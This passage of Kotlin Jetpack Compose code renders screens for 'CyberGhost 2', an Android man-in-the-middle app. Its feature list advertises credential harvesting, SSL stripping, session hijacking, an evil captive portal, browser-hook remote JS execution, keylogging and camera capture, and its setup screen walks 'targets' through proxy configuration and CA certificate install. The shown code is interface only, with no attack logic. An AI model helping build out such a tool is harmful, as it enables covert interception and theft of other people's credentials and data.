                    Text("n0obcoders.github.io/portfoli0", fontSize = 12.sp, color = CgCyan)
                }
            }
        }

        item {
            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp)) {
                Column(Modifier.padding(16.dp)) {
                    Text("About", fontSize = 14.sp, fontWeight = FontWeight.Bold, color = CgAmber)
                    Spacer(Modifier.height(8.dp))
                    Text("CyberGhost 2 is an advanced man-in-the-middle framework for Android. Turn your device into a transparent WiFi gateway to intercept, inspect, modify, and inject content into all network traffic from connected targets.", fontSize = 12.sp, color = CgGray, lineHeight = 18.sp)
                }
            }
        }

        item {
            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp)) {
                Column(Modifier.padding(16.dp)) {
                    Text("Features", fontSize = 14.sp, fontWeight = FontWeight.Bold, color = CgAmber)
                    Spacer(Modifier.height(8.dp))
                    val features = listOf(
                        "Transparent HTTP/HTTPS interception via DNS redirect",
                        "SSLStrip — downgrade HTTPS links to HTTP in transit",
                        "Credential harvester — forms, JSON, Basic Auth, Bearer tokens, cookies",
                        "Session hijacker — replay captured cookies in your browser",
                        "Evil captive portal — intercept targets before granting WiFi access",
                        "Browser hook agent with remote JS execution (C2)",
                        "Keylogging, cookie/storage extraction, form grabbing",
                        "Screenshot and camera capture from hooked browsers",
                        "Network mapping with MAC vendor identification",
                        "WebSocket frame capture",
                        "Live traffic statistics and bandwidth chart",
                        "HAR export, session snapshots, injection profiles",
                        "Auto-start on boot, live notification",
                        "No root required"
                    )
                    features.forEach { FeatureItem(it) }
                }
            }
        }
        item { Spacer(Modifier.height(20.dp)) }
    }
}

@Composable
fun FeatureItem(text: String) {
    Row(Modifier.padding(vertical = 3.dp), verticalAlignment = Alignment.Top) {
        Text("▸", fontSize = 10.sp, color = CgGreen, modifier = Modifier.padding(top = 1.dp))
        Spacer(Modifier.width(8.dp))
        Text(text, fontSize = 11.sp, color = CgGray, lineHeight = 16.sp)
    }
}

// ============================
// SHARED COMPONENTS
// ============================
@Composable
fun EmptyState(icon: ImageVector, title: String, subtitle: String) {
    Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
        Column(horizontalAlignment = Alignment.CenterHorizontally, verticalArrangement = Arrangement.spacedBy(8.dp)) {
            Box(Modifier.size(64.dp).clip(RoundedCornerShape(16.dp)).background(CgGray.copy(0.1f)), contentAlignment = Alignment.Center) {
                Icon(icon, contentDescription = null, tint = CgGray, modifier = Modifier.size(30.dp))
            }
            Text(title, fontSize = 15.sp, color = CgWhite, fontWeight = FontWeight.Medium)
            Text(subtitle, fontSize = 12.sp, color = CgGray, textAlign = androidx.compose.ui.text.style.TextAlign.Center)
        }
    }
}

fun formatBytes(bytes: Long): String = when {
    bytes < 1024 -> "$bytes B"
    bytes < 1024 * 1024 -> "${bytes / 1024} KB"
    bytes < 1024 * 1024 * 1024 -> "${"%.1f".format(bytes / (1024.0 * 1024.0))} MB"
    else -> "${"%.2f".format(bytes / (1024.0 * 1024.0 * 1024.0))} GB"
}


// ============================
// SETUP INSTRUCTIONS SCREEN
// ============================
@Composable
fun SetupScreen(gatewayIp: String, isRunning: Boolean) {
    LazyColumn(
        Modifier.fillMaxSize().padding(16.dp),
        verticalArrangement = Arrangement.spacedBy(12.dp)
    ) {
        item {
            Text("Proxy Setup", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite)
            Spacer(Modifier.height(4.dp))
            Text(
                "Targets must configure their WiFi proxy to route traffic through CyberGhost.",
                fontSize = 12.sp, color = CgGray, lineHeight = 16.sp
            )
        }

        // gateway info card
        item {
            Card(
                Modifier.fillMaxWidth(),
                colors = CardDefaults.cardColors(containerColor = CgGreen.copy(0.08f)),
                shape = RoundedCornerShape(12.dp),
                border = BorderStroke(1.dp, CgGreen.copy(0.3f))
            ) {
                Column(Modifier.padding(16.dp)) {
                    Text("Your Gateway", fontSize = 12.sp, color = CgGray)
                    Spacer(Modifier.height(6.dp))
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Text(gatewayIp, fontSize = 28.sp, fontWeight = FontWeight.Black, color = CgGreen, fontFamily = FontFamily.Monospace)
                        Text(":8080", fontSize = 20.sp, color = CgAmber, fontFamily = FontFamily.Monospace)
                    }
                    Spacer(Modifier.height(4.dp))
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Box(Modifier.size(8.dp).clip(CircleShape).background(if (isRunning) CgGreen else CgRed))
                        Spacer(Modifier.width(6.dp))
                        Text(if (isRunning) "Proxy running" else "Start capture first", fontSize = 11.sp, color = if (isRunning) CgGreen else CgRed)
                    }
                }
            }
        }

        // android steps
        item {
            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp)) {
                Column(Modifier.padding(16.dp)) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Box(Modifier.size(28.dp).clip(RoundedCornerShape(6.dp)).background(CgGreen.copy(0.15f)), contentAlignment = Alignment.Center) {
                            Text("A", fontSize = 14.sp, fontWeight = FontWeight.Bold, color = CgGreen)
                        }
                        Spacer(Modifier.width(10.dp))
                        Text("Android Setup", fontSize = 14.sp, fontWeight = FontWeight.Bold, color = CgWhite)
                    }
                    Spacer(Modifier.height(12.dp))
                    SetupStep(1, "Settings → WiFi")
                    SetupStep(2, "Long press the \"CyberGhost\" hotspot network")
                    SetupStep(3, "Modify network → Show advanced options")
                    SetupStep(4, "Proxy → Manual")
                    SetupStep(5, "Hostname: $gatewayIp")
                    SetupStep(6, "Port: 8080 → Save")
                }
            }
        }

        // ios steps
        item {
            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp)) {
                Column(Modifier.padding(16.dp)) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Box(Modifier.size(28.dp).clip(RoundedCornerShape(6.dp)).background(CgCyan.copy(0.15f)), contentAlignment = Alignment.Center) {
                            Text("i", fontSize = 14.sp, fontWeight = FontWeight.Bold, color = CgCyan)
                        }
                        Spacer(Modifier.width(10.dp))
                        Text("iOS / iPhone Setup", fontSize = 14.sp, fontWeight = FontWeight.Bold, color = CgWhite)
                    }
                    Spacer(Modifier.height(12.dp))
                    SetupStep(1, "Settings → WiFi")
                    SetupStep(2, "Tap ⓘ next to the hotspot network")
                    SetupStep(3, "HTTP Proxy → Manual")
                    SetupStep(4, "Server: $gatewayIp")
                    SetupStep(5, "Port: 8080 → Save")
                }
            }
        }

        // CA cert install
        item {
            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgAmber.copy(0.06f)),
                shape = RoundedCornerShape(12.dp), border = BorderStroke(1.dp, CgAmber.copy(0.2f))) {
                Column(Modifier.padding(16.dp)) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(Icons.Filled.Security, contentDescription = null, tint = CgAmber, modifier = Modifier.size(20.dp))
                        Spacer(Modifier.width(8.dp))
                        Text("For HTTPS Decryption", fontSize = 14.sp, fontWeight = FontWeight.Bold, color = CgAmber)
                    }
                    Spacer(Modifier.height(10.dp))
                    Text("Tap the CA button in CyberGhost → share the cert to the target device", fontSize = 12.sp, color = CgGray, lineHeight = 16.sp)
                    Spacer(Modifier.height(8.dp))
                    Text("Android: Settings → Security → Install certificate → CA certificate", fontSize = 11.sp, color = CgGray, lineHeight = 15.sp)
                    Spacer(Modifier.height(4.dp))
                    Text("iOS: Settings → General → VPN & Device Management → install cert, then enable it in Certificate Trust Settings", fontSize = 11.sp, color = CgGray, lineHeight = 15.sp)
                }
            }
        }

        // what you'll see
        item {
            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp)) {
                Column(Modifier.padding(16.dp)) {
                    Text("What You'll See", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgWhite)
                    Spacer(Modifier.height(8.dp))
                    ResultRow(CgAmber, "HTTP traffic", "visible immediately after proxy set")
                    ResultRow(CgCyan, "HTTPS traffic", "visible after CA cert installed")
                    ResultRow(CgRed, "Credentials", "auto-extracted from login forms")
                    ResultRow(CgMagenta, "Hook agent", "loads when target visits any HTTP page")
                    ResultRow(CgDimGreen, "DNS queries", "visible after proxy set")
                }
            }
        }
    }
}

@Composable
fun SetupStep(num: Int, text: String) {
    Row(Modifier.padding(vertical = 4.dp), verticalAlignment = Alignment.Top) {
        Box(Modifier.size(20.dp).clip(CircleShape).background(CgGreen.copy(0.15f)), contentAlignment = Alignment.Center) {
            Text("$num", fontSize = 10.sp, color = CgGreen, fontWeight = FontWeight.Bold)
        }
        Spacer(Modifier.width(8.dp))
        Text(text, fontSize = 12.sp, color = CgWhite, lineHeight = 16.sp)
    }
}

@Composable
fun ResultRow(color: Color, label: String, desc: String) {
    Row(Modifier.padding(vertical = 3.dp), verticalAlignment = Alignment.CenterVertically) {
        Box(Modifier.size(8.dp).clip(CircleShape).background(color))
        Spacer(Modifier.width(8.dp))
        Text("$label: ", fontSize = 11.sp, color = color, fontWeight = FontWeight.SemiBold)
        Text(desc, fontSize = 11.sp, color = CgGray)
    }
}

// DevicesScreen already defined above — this adds networkHosts fallback display
@Composable
fun NetworkHostsAsDevices(hosts: List<NetworkHost>) {
    if (hosts.isEmpty()) return
    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
        item {
            Text("Discovered Hosts", fontSize = 16.sp, fontWeight = FontWeight.Bold, color = CgWhite)
            Text("From last network scan — tap Setup to configure proxy on these devices", fontSize = 11.sp, color = CgGray, lineHeight = 15.sp)
        }
        items(hosts) { host ->
            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(10.dp)) {
                Row(Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
                    Box(Modifier.size(36.dp).clip(RoundedCornerShape(8.dp)).background(
                        if (host.isGateway) CgGreen.copy(0.15f) else CgCyan.copy(0.1f)), contentAlignment = Alignment.Center) {
                        Icon(if (host.isGateway) Icons.Filled.Router else Icons.Filled.PhoneAndroid,
                            contentDescription = null, tint = if (host.isGateway) CgGreen else CgCyan, modifier = Modifier.size(18.dp))
                    }
                    Spacer(Modifier.width(10.dp))
                    Column(Modifier.weight(1f)) {
                        Text(host.hostname ?: host.ip, fontSize = 13.sp, color = CgWhite, fontWeight = FontWeight.Medium)
                        if (host.hostname != null) Text(host.ip, fontSize = 10.sp, color = CgGray)
                        host.mac?.let { Text(it, fontSize = 9.sp, color = CgGray.copy(0.6f)) }
                    }
                    Column(horizontalAlignment = Alignment.End) {
                        host.vendor?.let { Badge(containerColor = CgCyan.copy(0.12f)) { Text(it.take(10), fontSize = 8.sp, color = CgCyan, modifier = Modifier.padding(horizontal = 4.dp)) } }
                        if (!host.isGateway) {
                            Spacer(Modifier.height(4.dp))
                            Text("needs proxy config", fontSize = 8.sp, color = CgAmber)
                        }
                    }
                }
            }
        }
    }
}
